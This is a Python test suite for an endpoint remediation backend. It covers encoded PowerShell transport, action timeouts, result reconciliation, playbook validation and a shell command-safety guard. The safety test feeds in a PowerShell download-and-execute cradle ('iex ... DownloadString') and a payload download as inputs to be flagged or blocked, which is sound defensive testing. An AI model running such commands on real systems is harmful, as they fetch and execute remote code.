from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path

import pytest
from fastapi import HTTPException


BACKEND_DIR = Path(__file__).resolve().parents[1]
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

from api import actions as actions_api  # noqa: E402
from api import playbooks as playbooks_api  # noqa: E402
from api.actions import _coerce_custom_os_command_arguments  # noqa: E402
from core import action_execution as action_execution_module  # noqa: E402
from core.action_execution import _requires_endpoint_transport  # noqa: E402
from core.actions import ensure_public_action  # noqa: E402
from core.endpoint_executor import (  # noqa: E402
    EndpointExecutor,
    _ps_encoded_command,
    _ps_encoded_command_args,
)
from core.global_shell_ai import assess_command_safety, enforce_command_safety  # noqa: E402
from core.wazuh_verification import PostActionVerificationLoop, derive_verification_state  # noqa: E402


def _executor() -> EndpointExecutor:
    executor = EndpointExecutor.__new__(EndpointExecutor)
    executor.default_timeout = 120
    return executor


def test_effective_timeout_extends_install_update_actions():
    executor = _executor()

    assert executor._effective_action_timeout_seconds("package-update", ["Git.Git"], {}) >= 3600
    assert executor._effective_action_timeout_seconds("software-install-upgrade", ["Git.Git"], {}) >= 3600
    assert executor._effective_action_timeout_seconds("windows-os-update", [], {}) >= 5400


def test_effective_timeout_extends_long_running_global_shell_commands():
    executor = _executor()

    assert (
        executor._effective_action_timeout_seconds(
            "custom-os-command",
            ["Invoke-WebRequest -Uri 'https://example.invalid/pkg.msi' -OutFile $env:TEMP\\pkg.msi; msiexec /i $env:TEMP\\pkg.msi /qn"],
            {"action_id": "global-shell"},
        )
        >= 3600
    )
    assert (
        executor._effective_action_timeout_seconds(
            "custom-os-command",
            ["Get-ComputerInfo | Select-Object WindowsVersion"],
            {},
        )
        == executor._action_timeout_seconds("custom-os-command")
    )


def test_custom_os_command_script_executes_encoded_powershell_payload():
    executor = _executor()

    script = executor._windows_action_script_content("custom-os-command")

    assert "function C2F-ResolveCommandPayload" in script
    assert "function C2F-RunEncodedCommand" in script
    assert "C2F-ResolveCommandPayload -CommandText $Command -CommandPath $CommandFile" in script
    assert '-EncodedCommand", $EncodedCommand' in script
    assert 'Set-Content -Path $scriptPath -Value $commandTextValue -Encoding Unicode -Force' in script
    assert '-File", $scriptPath' in script
    assert "C2F-RunEncodedCommand -EncodedCommand $encodedCommand -CommandText $cmd" in script
    assert "[string]$Command = \"\"" in script
    assert "ScriptBlock]::Create($CommandText)" not in script
    assert "[string]$SessionId" not in script
    assert "C2F-RunSessionCommand" not in script


def test_windows_custom_command_normalization_unwraps_powershell_command():
    wrapped_command = 'powershell.exe -Command "Invoke-WebRequest -Uri https://example.com/pkg.msi -OutFile $env:TEMP\\\\pkg.msi"'

    normalized = EndpointExecutor._normalize_windows_custom_command(wrapped_command)

    assert normalized == "Invoke-WebRequest -Uri https://example.com/pkg.msi -OutFile $env:TEMP\\\\pkg.msi"


def test_windows_custom_command_normalization_decodes_encoded_powershell_wrapper():
    inner = "Invoke-WebRequest -Uri https://example.com/pkg.msi -OutFile $env:TEMP\\pkg.msi"
    wrapped_command = "powershell.exe " + " ".join(_ps_encoded_command_args(inner))

    normalized = EndpointExecutor._normalize_windows_custom_command(wrapped_command)

    assert normalized == inner


def test_windows_custom_command_wrapper_promotes_non_terminating_errors_to_failures():
    wrapped = EndpointExecutor._wrap_windows_custom_command("winget --info")

    assert "$hadPipelineError = -not $?" in wrapped
    assert "$newErrors = $false" in wrapped
    assert "if($LASTEXITCODE -ne $null){ try { $nativeRc=[int]$LASTEXITCODE } catch { $nativeRc=1 } }" in wrapped
    assert "if($hadPipelineError -or $newErrors -or $nativeRc -ne 0){" in wrapped


def test_hash_blocklist_wrapper_normalizes_exit_and_pipeline_status():
    executor = _executor()
    script = executor._build_windows_script(
        "hash-blocklist",
        ["0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"],
        context={},
        target={},
    )

    assert "$global:LASTEXITCODE = 0;" in script
    assert "$hadPsError = -not $?;" in script
    assert "if($LASTEXITCODE -ne $null){ try { $nativeRc=[int]$LASTEXITCODE } catch { $nativeRc=1 } };" in script
    assert "if($nativeRc -ne 0){ throw $out };" in script
    assert "$successEvidence = ([string]$out) -match" in script
    assert "if($hadPsError -and (-not $successEvidence)){ throw $out };" in script


def test_service_restart_script_treats_running_service_as_recovered():
    executor = _executor()
    script = executor._build_windows_script("service-restart", ["wuauserv"], context={}, target={})

    assert "service_restart_warning=" in script
    assert "if($post -and $postState -eq 'Running')" in script
    assert "Write-Output ('service running '+$svc+' status='+$postState);" in script
    assert "throw ('service restart failed for '+$svc);" in script


def test_actions_result_rows_ok_rejects_non_dict_rows():
    assert actions_api._result_rows_ok({"results": [None, "nope"]}) is False


def test_actions_result_rows_counts_coerces_string_booleans():
    counts = actions_api._result_rows_counts(
        [
            {"ok": "true"},
            {"ok": "false"},
            {"ok": "1"},
            {"ok": "0"},
        ],
        fallback_total=4,
    )
    assert counts == {"total": 4, "completed": 4, "success": 2, "failed": 2}


def test_playbook_result_status_defaults_failed_without_success_signal():
    assert playbooks_api._result_status({}, []) == "FAILED"


def test_reconcile_semantic_success_result_promotes_scan_false_negative():
    executor = _executor()

    status, stdout, stderr = executor._reconcile_semantic_success_result(  # noqa: SLF001
        action_id="yara-scan",
        status_code=1,
        stdout=(
            "YARA scan complete: status=CLEAN matches=0 examined=18 path=C:\\Temp\n"
            "C2F_LOG 2026-04-09T10:20:30Z exec=999 agent=003 action=yara-scan user=SYSTEM "
            "evidence=scan_report_path=C:\\Click2Fix\\reports\\yara-scan-999.txt\n"
            "C2F_LOG 2026-04-09T10:20:31Z exec=999 agent=003 action=yara-scan user=SYSTEM "
            "evidence=scan_status=CLEAN\n"
            "report=C:\\Click2Fix\\reports\\yara-scan-999.txt"
        ),
        stderr="Endpoint execution failed",
    )

    assert status == 0
    assert stderr == ""
    assert "semantic_success_override" in stdout


def test_reconcile_semantic_success_result_keeps_real_error_failure():
    executor = _executor()

    status, _stdout, stderr = executor._reconcile_semantic_success_result(  # noqa: SLF001
        action_id="yara-scan",
        status_code=1,
        stdout=(
            "YARA scan complete: status=CLEAN matches=0 examined=18 path=C:\\Temp\n"
            "C2F_LOG 2026-04-09T10:20:31Z exec=999 agent=003 action=yara-scan user=SYSTEM "
            "evidence=error=scan path not found: C:\\Temp"
        ),
        stderr="scan path not found",
    )

    assert status == 1
    assert "scan path not found" in stderr


def test_reconcile_semantic_success_result_promotes_benign_custom_command_clixml():
    executor = _executor()

    status, stdout, stderr = executor._reconcile_semantic_success_result(  # noqa: SLF001
        action_id="custom-os-command",
        status_code=1,
        stdout="",
        stderr=(
            "#< CLIXML\n"
            "custom-os-command failed rc=1 output=#< CLIXML_x000D__x000A_"
            "[{\"TimeCreated\":\"/Date(1775740466680)/\",\"Message\":\"Creating Scriptblock text (1 of 1)\"}]"
        ),
    )

    assert status == 0
    assert stderr == ""
    assert "creating scriptblock text" in stdout.lower()
    assert "semantic_success_override" in stdout


def test_reconcile_semantic_success_result_keeps_custom_command_parser_failure():
    executor = _executor()

    status, stdout, stderr = executor._reconcile_semantic_success_result(  # noqa: SLF001
        action_id="custom-os-command",
        status_code=1,
        stdout="",
        stderr=(
            "#< CLIXML\n"
            "custom-os-command failed rc=1 output=#< CLIXML_x000D__x000A_"
            "ParserError: You must provide a value expression following the '-match' operator."
        ),
    )

    assert status == 1
    assert stdout == ""
    assert "parsererror" in stderr.lower()


def test_reconcile_semantic_success_result_promotes_status_success_with_log_stream_noise():
    executor = _executor()

    status, stdout, stderr = executor._reconcile_semantic_success_result(  # noqa: SLF001
        action_id="firewall-drop",
        status_code=1,
        stdout=(
            "blocked 1.2.3.4\n"
            "C2F_LOG 2026-04-10T12:35:01Z exec=777 agent=003 action=firewall-drop user=SYSTEM status=SUCCESS"
        ),
        stderr=(
            "#< CLIXML\n"
            "<Objs Version=\"1.1.0.1\"><S S=\"Error\">Get-Content : The process cannot access the file.</S></Objs>"
        ),
    )

    assert status == 0
    assert stderr == ""
    assert "semantic_success_override" in stdout


def test_powershell_transport_uses_explicit_encoded_command():
    command = "Write-Output 'transport-ok'"

    args = _ps_encoded_command_args(command)

    assert args[:4] == ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass"]
    assert args[4] == "-EncodedCommand"
    assert _ps_encoded_command(command) == args[5]


def test_package_update_script_contains_winget_bootstrap_path():
    executor = _executor()

    script = executor._windows_action_script_content("package-update")

    assert "Install-Module -Name Microsoft.WinGet.Client" in script
    assert "Repair-WinGetPackageManager" in script
    assert "Automatic App Installer/Repair-WinGetPackageManager bootstrap was attempted" in script
    assert "post_verify_fresh_install_present_no_version" in script
    assert "post_verify_present_after_unknown_before" in script
    assert "reason=already_target_state" in script
    assert "afterInstalledDetected = (($afterRows -and $afterRows.Count -gt 0) -or $afterArpPresent)" in script
    assert "if (Test-C2FNoiseLine $lineNorm) { continue }" in script
    assert "$skippedNoChange++" in script
    assert "$zeroSkippedProblem = [Math]::Max(0, ($skipped - $skippedNotInstalled - $skippedNoChange))" in script


def test_global_shell_requires_endpoint_transport():
    assert _requires_endpoint_transport("global-shell", {"action_command": "custom-os-command"}) is True
    assert _requires_endpoint_transport("custom-os-command", {"action_command": "custom-os-command"}) is True
    assert _requires_endpoint_transport("firewall-drop", {"action_command": "firewall-drop"}) is False


def test_custom_os_command_arguments_are_stateless():
    args = _coerce_custom_os_command_arguments([], command="Write-Host hi")
    assert args == ["Write-Host hi", "", "", "", "false"]

    legacy = _coerce_custom_os_command_arguments(
        ["Write-Host hi", "", "", "", "false", "session-2"],
        command="Write-Host hi",
    )
    assert legacy == ["Write-Host hi", "", "", "", "false"]


def test_async_global_shell_builds_dispatch_for_powershell(monkeypatch):
    class _DummyResult:
        def __init__(self, scalar_value=None):
            self._scalar_value = scalar_value

        def scalar(self):
            return self._scalar_value

    class _DummyDB:
        def execute(self, *_args, **_kwargs):
            return _DummyResult(None)

        def commit(self):
            return None

        def close(self):
            return None

    dispatch_calls = []

    monkeypatch.setattr(actions_api, "connect", lambda: _DummyDB())
    monkeypatch.setattr(actions_api, "publish_event", lambda *_args, **_kwargs: None)
    monkeypatch.setattr(actions_api, "_store_execution_targets", lambda *_args, **_kwargs: None)
    monkeypatch.setattr(
        actions_api,
        "enforce_command_safety",
        lambda *_args, **_kwargs: {"risk_score": 0, "reasons": []},
    )

    def _fake_build_dispatch(**kwargs):
        dispatch_calls.append(kwargs)
        return {"transport": "custom-os-command"}, ["Write-Host hi", "", "", "", "false"]

    monkeypatch.setattr(actions_api, "_build_global_shell_dispatch", _fake_build_dispatch)
    monkeypatch.setattr(
        actions_api,
        "execute_action",
        lambda *_args, **_kwargs: {
            "channel": "endpoint",
            "mode": "endpoint",
            "result": {
                "success": 1,
                "failed": 0,
                "total": 1,
                "results": [{"agent_id": "001", "ok": True, "stdout": "ok", "stderr": ""}],
            },
        },
    )

    actions_api._run_global_shell_async_job(
        execution_id=999,
        action_id="global-shell",
        shell="powershell",
        selected_ids=["001"],
        raw_command="Write-Host hi",
        run_as_system=False,
        ai_config={"provider": "openai", "model": "test-model"},
    )

    assert dispatch_calls
    assert dispatch_calls[0]["command_to_run"] == "Write-Host hi"


def test_public_action_guard_blocks_internal_transport():
    with pytest.raises(HTTPException) as exc_info:
        ensure_public_action("custom-os-command")

    assert exc_info.value.status_code == 403
    assert "reserved for internal orchestration" in str(exc_info.value.detail)


def test_global_shell_safety_flags_download_but_allows_admin_operation(monkeypatch):
    download = assess_command_safety(
        "Invoke-WebRequest -Uri https://example.com/payload.ps1 -OutFile $env:TEMP\\payload.ps1",
        shell="powershell",
    )
    assert download["blocked"] is False
    assert download["absolute_blocked"] is False
    assert download["risk_score"] >= 48
    assert "Direct network transfer command" in download["reasons"]

    relaxed = enforce_command_safety(
        "iex (New-Object Net.WebClient).DownloadString('https://example.com/x')",
        shell="powershell",
    )
    assert relaxed["blocked"] is True

    monkeypatch.setenv("C2F_ENFORCE_SHELL_SAFETY_BLOCKS", "true")
    with pytest.raises(HTTPException) as exc_info:
        enforce_command_safety("iex (New-Object Net.WebClient).DownloadString('https://example.com/x')", shell="powershell")
    assert exc_info.value.status_code == 400
    assert "blocked by safety guard" in str(exc_info.value.detail).lower()


def test_global_shell_safety_does_not_treat_format_table_as_disk_format():
    safe = assess_command_safety(
        "Get-WmiObject Win32_LogicalDisk | Format-Table DeviceID, Size, FreeSpace",
        shell="powershell",
    )

    assert safe["blocked"] is False
    assert safe["destructive"] is False
    assert "Potentially destructive operation" not in (safe.get("reasons") or [])


def test_playbook_validation_allows_internal_shell_steps():
    direct = playbooks_api._validated_playbook_steps(
        {
            "steps": [
                {
                    "id": "step_1",
                    "action": "custom-os-command",
                    "args": {"command": "Write-Host nope"},
                }
            ]
        }
    )
    assert direct[0]["action"] == "custom-os-command"

    alias = playbooks_api._validated_playbook_steps(
        {
            "steps": [
                {
                    "id": "step_1",
                    "action": "global-shell",
                    "args": {"command": "Write-Host alias"},
                }
            ]
        }
    )
    assert alias[0]["action"] == "custom-os-command"


def test_playbook_validation_allows_custom_action_ids_for_draft_save():
    custom = playbooks_api._validated_playbook_steps(
        {
            "steps": [
                {
                    "id": "step_1",
                    "action": "custom-remediate.step",
                    "args": {"mode": "strict"},
                }
            ]
        },
        require_known_actions=False,
    )
    assert custom[0]["action"] == "custom-remediate.step"


def test_playbook_validation_rejects_unknown_actions_for_execution():
    with pytest.raises(HTTPException) as exc_info:
        playbooks_api._validated_playbook_steps(
            {
                "steps": [
                    {
                        "id": "step_1",
                        "action": "custom-remediate.step",
                        "args": {"mode": "strict"},
                    }
                ]
            },
            require_known_actions=True,
        )

    assert exc_info.value.status_code == 400
    assert "unsupported action" in str(exc_info.value.detail).lower()


def test_execute_serializes_custom_os_command_targets():
    executor = EndpointExecutor.__new__(EndpointExecutor)
    executor.max_workers = 8
    executor.stop_on_error = False
    executor.windows_patch_stagger_seconds = 0
    executor.windows_patch_stagger_min_targets = 5

    target_rows = {
        "001": {"agent_id": "001", "agent_name": "alpha", "ip": "10.0.0.1", "platform": "windows"},
        "002": {"agent_id": "002", "agent_name": "beta", "ip": "10.0.0.2", "platform": "windows"},
        "003": {"agent_id": "003", "agent_name": "gamma", "ip": "10.0.0.3", "platform": "windows"},
    }
    order = []

    executor._build_agent_lookup = lambda agent_ids: {agent_id: {} for agent_id in agent_ids}
    executor._resolve_agent_target = lambda agent_id, agent_lookup=None: target_rows[agent_id]
    executor._guard_task_ingestion_for_memory = lambda *_args, **_kwargs: None

    def _fake_execute_target(action_id, action_args, target, context):
        order.append(target["agent_id"])
        return {
            "agent_id": target["agent_id"],
            "agent_name": target["agent_name"],
            "target_ip": target["ip"],
            "platform": target["platform"],
            "ok": True,
            "stdout": f"ok-{target['agent_id']}",
            "stderr": "",
        }

    executor._execute_target = _fake_execute_target

    result = executor.execute(
        action_id="custom-os-command",
        action_args=["Write-Host hi"],
        agent_ids=["001", "002", "003"],
        context={},
    )

    assert order == ["001", "002", "003"]
    assert [row["agent_id"] for row in result["results"]] == ["001", "002", "003"]


def test_custom_os_command_uses_inline_payload_for_non_system_fast_path():
    executor = EndpointExecutor.__new__(EndpointExecutor)
    executor.windows_inline_custom_command_max_chars = 4096
    executor._effective_action_timeout_seconds = lambda *_args, **_kwargs: 120
    executor._ensure_windows_action_script = lambda *_args, **_kwargs: None
    executor._upload_windows_script = lambda *_args, **_kwargs: pytest.fail("unexpected payload upload")
    executor._run_winrm = lambda *_args, **_kwargs: (0, "", "")
    executor._execute_windows_script_task = lambda *_args, **kwargs: (
        0,
        json.dumps(kwargs.get("script_args") or {}),
        "",
    )

    target = {
        "agent_id": "003",
        "agent_name": "LAPTOP-9GQ8LUGU",
        "ip": "192.168.1.236",
        "platform": "windows",
    }
    result = executor._execute_target(  # noqa: SLF001
        "custom-os-command",
        ["whoami", "", "", "", "false"],
        target,
        {},
    )

    assert result["ok"] is True
    script_args = json.loads(result["stdout"])
    assert script_args["RunAsSystem"] is False
    assert str(script_args.get("Command") or "").startswith("C2FENC:")
    assert not script_args.get("CommandFile")


def test_custom_os_command_keeps_file_payload_for_system_mode():
    executor = EndpointExecutor.__new__(EndpointExecutor)
    executor.windows_inline_custom_command_max_chars = 4096
    executor._effective_action_timeout_seconds = lambda *_args, **_kwargs: 120
    executor._ensure_windows_action_script = lambda *_args, **_kwargs: None
    executor._execution_tag = lambda *_args, **_kwargs: "exec001"
    upload_calls = []
    executor._upload_windows_script = lambda *_args, **_kwargs: upload_calls.append(True)
    executor._run_winrm = lambda *_args, **_kwargs: (0, "", "")
    executor._execute_windows_script_task = lambda *_args, **kwargs: (
        0,
        json.dumps(kwargs.get("script_args") or {}),
        "",
    )

    target = {
        "agent_id": "003",
        "agent_name": "LAPTOP-9GQ8LUGU",
        "ip": "192.168.1.236",
        "platform": "windows",
    }
    result = executor._execute_target(  # noqa: SLF001
        "custom-os-command",
        ["whoami", "", "", "", "true"],
        target,
        {},
    )

    assert result["ok"] is True
    assert upload_calls
    script_args = json.loads(result["stdout"])
    assert script_args["RunAsSystem"] is True
    assert str(script_args.get("CommandFile") or "").endswith(".ps1")


def test_post_action_verification_short_circuits_already_satisfied_package_targets():
    verifier = PostActionVerificationLoop(client=object())

    result = verifier.verify_targets(
        "package-update",
        225,
        [
            {
                "agent_id": "003",
                "ok": True,
                "stdout": "package update complete: outcome=SUCCESS applicable=0 installable=0 installed=0 failed=0 remaining=0 skipped=1 unresolved=0\nreason=no_applicable_update\nupdates_skipped_no_change=1",
                "stderr": "",
            }
        ],
    )
    state = derive_verification_state(result)

    assert result["ok"] is True
    assert result["strategy"] == "already_at_target_state_short_circuit"
    assert result["summary"]["already_satisfied"] == 1
    assert state["ok"] is True
    assert state["pending"] is False
    assert state["execution_status"] is None


def test_post_action_verification_short_circuits_already_target_state_marker():
    verifier = PostActionVerificationLoop(client=object())

    result = verifier.verify_targets(
        "software-install-upgrade",
        278,
        [
            {
                "agent_id": "002",
                "ok": True,
                "stdout": "skipped_update_0=Notepad++.Notepad++|Notepad++|reason=already_target_state|installed_before=8.7.2",
                "stderr": "",
            }
        ],
    )

    assert result["ok"] is True
    assert result["strategy"] == "already_at_target_state_short_circuit"


def test_run_endpoint_returns_partial_without_raising(monkeypatch):
    class _FakeExecutor:
        def __init__(self, _client):
            return None

        def execute(self, **_kwargs):
            return {
                "ok": False,
                "total": 2,
                "success": 1,
                "failed": 1,
                "results": [
                    {"agent_id": "001", "ok": True, "stdout": "ok", "stderr": ""},
                    {"agent_id": "002", "ok": False, "stdout": "", "stderr": "timed out"},
                ],
            }

    monkeypatch.setattr(action_execution_module, "EndpointExecutor", _FakeExecutor)
    monkeypatch.setattr(action_execution_module, "publish_event", lambda *_args, **_kwargs: None)

    payload = action_execution_module._run_endpoint(  # noqa: SLF001
        client=object(),
        action_id="package-update",
        dispatch={"action_command": "package-update", "arguments": []},
        agent_ids=["001", "002"],
        execution_id=901,
        context={},
    )

    assert payload["result"]["overall_status"] == "PARTIAL"


def test_actions_run_accepts_agent_ids_without_single_agent(monkeypatch):
    captured = {}

    class _FakeRequest:
        def __init__(self):
            self.client = type("Client", (), {"host": "127.0.0.1"})()

        async def json(self):
            return {
                "action_id": "sca-rescan",
                "agent_ids": ["1", "002"],
                "exclude_agent_ids": ["002"],
                "args": {},
            }

    monkeypatch.setattr(actions_api, "ensure_public_action", lambda action_id: str(action_id))
    monkeypatch.setattr(
        actions_api,
        "get_action",
        lambda _aid: {"id": "sca-rescan", "command": "sca-rescan", "inputs": [], "custom": True},
    )
    monkeypatch.setattr(actions_api, "normalize_args", lambda _action, _args: [])
    monkeypatch.setattr(
        actions_api,
        "resolve_action_dispatch",
        lambda _action, _arguments: {"action_command": "sca-rescan", "arguments": []},
    )
    monkeypatch.setattr(actions_api, "action_requires_approval_handshake", lambda *_args, **_kwargs: False)
    monkeypatch.setattr(actions_api, "log_audit", lambda *_args, **_kwargs: None)

    def _fake_execute_action(_client, action_id, dispatch, agent_ids):
        captured["action_id"] = action_id
        captured["dispatch"] = dispatch
        captured["agent_ids"] = list(agent_ids)
        return {
            "channel": "manager_api",
            "mode": "manager_api",
            "command_used": "agents/restart",
            "attempts": ["agents/restart"],
            "result": {"ok": True, "total": 1, "success": 1, "failed": 0, "results": []},
        }

    monkeypatch.setattr(actions_api, "execute_action", _fake_execute_action)

    payload = asyncio.run(actions_api.run_action(_FakeRequest(), user={"sub": "admin", "org_id": "1"}))

    assert payload["status"] == "executed"
    assert captured["action_id"] == "sca-rescan"
    assert captured["agent_ids"] == ["001"]
    assert payload["result"]["success"] == 1
    assert payload["result"]["failed"] == 0


def test_execute_action_batches_large_endpoint_runs(monkeypatch):
    calls = []
    progress_events = []

    def _fake_run_endpoint(client, action_id, dispatch, agent_ids, execution_id=None, context=None):
        calls.append(list(agent_ids))
        rows = [
            {
                "agent_id": agent_id,
                "agent_name": f"agent-{agent_id}",
                "target_ip": "10.0.0.1",
                "platform": "windows",
                "ok": True,
                "stdout": f"ok-{agent_id}",
                "stderr": "",
            }
            for agent_id in agent_ids
        ]
        return {
            "channel": "endpoint",
            "mode": "endpoint",
            "command_used": action_id,
            "attempts": [action_id],
            "result": {
                "ok": True,
                "total": len(rows),
                "success": len(rows),
                "failed": 0,
                "results": rows,
            },
        }

    monkeypatch.setattr(action_execution_module, "_run_endpoint", _fake_run_endpoint)
    monkeypatch.setattr(action_execution_module, "_resolve_manager_api_action", lambda *_args, **_kwargs: "")
    monkeypatch.setattr(action_execution_module, "orchestration_mode", lambda: "endpoint")
    monkeypatch.setattr(action_execution_module, "_execution_batch_size", lambda: 2)
    monkeypatch.setattr(action_execution_module, "_execution_batch_threshold", lambda: 3)
    monkeypatch.setattr(action_execution_module, "publish_event", lambda *_args, **_kwargs: None)

    payload = action_execution_module.execute_action(
        client=object(),
        action_id="package-update",
        dispatch={"action_command": "package-update", "arguments": []},
        agent_ids=["001", "002", "003", "004", "005"],
        execution_id=777,
        context={
            "approval_id": 777,
            "approval_status": "APPROVED",
            "_batch_progress_callback": lambda progress: progress_events.append(dict(progress)),
        },
    )

    assert calls == [["001", "002"], ["003", "004"], ["005"]]
    assert payload["result"]["batched"] is True
    assert payload["result"]["total"] == 5
    assert payload["result"]["success"] == 5
    assert len(progress_events) == 3
    assert progress_events[-1]["completed"] == 5
    assert progress_events[-1]["status"] == "SUCCESS"
